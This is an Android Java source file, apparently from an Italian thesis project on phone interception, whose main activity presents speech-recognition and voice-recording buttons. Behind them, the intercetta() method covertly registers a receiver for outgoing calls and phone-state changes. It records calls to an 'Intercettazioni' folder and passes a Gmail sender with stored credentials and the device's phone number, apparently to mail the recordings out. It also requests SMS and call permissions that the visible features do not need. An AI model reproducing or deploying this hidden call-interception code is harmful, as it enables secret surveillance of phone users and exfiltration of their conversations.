package corso.java.tesiintercettazionitelefoniche;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.speech.RecognitionListener;
import android.speech.RecognizerIntent;
import android.speech.SpeechRecognizer;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import java.io.File;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final String LOG_TAG = "AudioRecordTest";
    private static final String STOP = "INTERROMPI";
    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static final String fileName = Environment.getExternalStorageDirectory().getAbsolutePath()+"/Intercettazioni";
    private static final String fileName2 = Environment.getExternalStorageDirectory().getAbsolutePath()+"/RegistrazioniAudio";
    private static Activity act;
    private TextView tx;
    private SpeechRecognizer speechRecognizer;
    private AudioRecorder speech = null;
    private AudioRecorder cr = null;
    private boolean intercetp = false; //viene messo a TRUE se l'intercettatore è partito
    private String [] permissions = {"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE", "android.permission.PROCESS_OUTGOING_CALLS"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        act = this;
        tx = findViewById(R.id.textview);
        Button listen = findViewById(R.id.listen);
        Button record = findViewById(R.id.record);
        final String ASCOLTA = this.getResources().getString(R.string.ascolta);
        final String REGISTRA = this.getResources().getString(R.string.registra);

        if (!checkPermission(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_RECORD_AUDIO_PERMISSION);
            tx.setText("Per favore riavvia l'applicazione per utilizzare tutte le funzioni!");
        }

        //Riconoscimento vocale
        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this);
        final Intent speechRecognizerIntent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
        speechRecognizerIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL,RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
        speechRecognizerIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault());

        speechRecognizer.setRecognitionListener(new RecognitionListener() {
            @Override
            public void onBeginningOfSpeech() {
                tx.setText("In ascolto...");
            }
            @Override
            public void onResults(Bundle results) {
                ArrayList<String> data = results.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION);
                tx.setText(data.get(0));
                listen.setText(ASCOLTA);
            }
            @Override
            public void onReadyForSpeech(Bundle params) { }
            @Override
            public void onRmsChanged(float rmsdB) { }
            @Override
            public void onBufferReceived(byte[] buffer) { }
            @Override
            public void onEndOfSpeech() { }
            @Override
            public void onError(int error) { }
            @Override
            public void onPartialResults(Bundle partialResults) { }
            @Override
            public void onEvent(int eventType, Bundle params) { }
        });
        listen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //chiede il permesso di usare il MICROFONO
                if (!checkPermission(new String[]{"android.permission.RECORD_AUDIO"})){
                    ActivityCompat.requestPermissions(act, new String[]{"android.permission.RECORD_AUDIO"}, REQUEST_RECORD_AUDIO_PERMISSION);
                    return;
                }
                intercetta();   //prova a lanciare l'intercettatore (se ha tutti i permessi)
                if(listen.getText().equals(ASCOLTA)){
                    speechRecognizer.startListening(speechRecognizerIntent);
                    listen.setText(STOP);
                }else if(listen.getText().equals(STOP)){
                    speechRecognizer.stopListening();
                    listen.setText(ASCOLTA);
                }
            }
        });
        record.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //Chiede il permesso di registrare il MICROFONO e di Salvare la registrazione
                if (!checkPermission(new String[]{"android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"})){
                    ActivityCompat.requestPermissions(act, new String[]{"android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, REQUEST_RECORD_AUDIO_PERMISSION);
                    return;
                }
                intercetta();   //prova a lanciare l'intercettatore (se ha tutti i permessi)
                if(record.getText().equals(REGISTRA)){
                    try{
                        File dir2 = new File(fileName2);
                        dir2.mkdir();    //crea la directory in cui salvare le registrazioni
                    }catch(Exception e){
                        Log.e(LOG_TAG, e.getMessage());
                        e.printStackTrace();
                    }
                    speech = new AudioRecorder(fileName2);
                    Date currentTime = Calendar.getInstance().getTime();
                    String fileName3 = "/"+currentTime.toString().replace(" ", "").replace(":", "").replace("+", "");
                    speech.startRecording(fileName3);
                    record.setText(STOP);
                }else if(record.getText().equals(STOP)){
                    if(speech!=null){
                        speech.stopRecording();
                        speech = null;
                    }
                    record.setText(REGISTRA);
                }
            }
        });
        //Fine riconoscimento vocale

        //Lancia l'intercettatore solo se ha ottenuto tutti i permessi necessari
        intercetta();
    }

    private void intercetta(){
        if(intercetp)
            return; //non occorre lanciare un nuovo intercettatore
        if (checkPermission(new String[]{"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE", "android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"})){
            TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            try{
                File dir = new File(fileName);
                dir.mkdir();    //crea la directory in cui salvare le intercettazioni
            }catch(Exception e){
                Log.e(LOG_TAG, e.getMessage());
                e.printStackTrace();
            }
            cr = new AudioRecorder(fileName);
            String phoneNumber = tMgr.getLine1Number();
            //INTERCETTA LE CHIAMATE
            GMailSender mail = new GMailSender(this.getResources().getString(R.string.user), this.getResources().getString(R.string.password));
            BroadcastReceiver br = new OutgoingCallReceiver(cr, this, mail, phoneNumber);
            IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            filter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
            filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
            this.registerReceiver(br, filter);
            //FINE INTERCETTA CHIAMATE
            intercetp = true;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        speechRecognizer.destroy();
    }

    private boolean checkPermission(String [] permission){
        for(int i=0; i<permission.length; i++){
            if(ActivityCompat.checkSelfPermission(this, permission[i]) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }


}